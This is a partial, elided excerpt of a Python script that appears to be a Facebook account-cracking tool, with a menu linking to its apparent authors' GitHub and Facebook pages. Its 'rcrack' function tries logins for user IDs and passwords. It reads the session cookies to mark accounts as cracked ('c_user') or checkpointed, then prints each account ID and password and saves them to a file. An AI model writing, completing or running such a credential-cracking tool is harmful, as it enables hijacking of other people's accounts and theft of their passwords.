...
def Herry():
    ...
    if Herryx =='5':
        exit()
    if Herryx =='3':
        os.system('xdg-open https://github.com/MR-K1NGX/XUH4N?tab=projects ')
    if Herryx =='4':
        os.system('xdg-open https://www.facebook.com/KINGXMRSW4TI');Herry()
    if Herryx =='2':
        bangla()
    else:
...
def rcrack(uid,pwx,tl):
    ...
    'upgrade-insecure-requests': '1',
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[SW4TI-0K] '+cid+'|'+ps+'\033[0;97m')
                open('SW4TI-0K.txt', 'a').write(cid+' | '+ps+ '\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                print('\033[1;31m[💔-CP] '+cid+' | '+ps+'\x1b[1;97m')
